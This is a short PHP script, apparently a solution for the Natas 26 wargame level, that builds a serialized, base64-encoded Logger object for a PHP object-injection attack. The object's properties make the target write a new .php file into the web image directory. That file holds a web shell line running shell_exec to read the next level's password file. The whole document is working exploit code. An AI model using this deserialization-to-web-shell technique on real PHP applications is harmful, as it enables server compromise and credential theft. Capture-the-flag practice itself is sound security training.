<?php

class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_n53bc51har59r90sln2ld5380e.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));
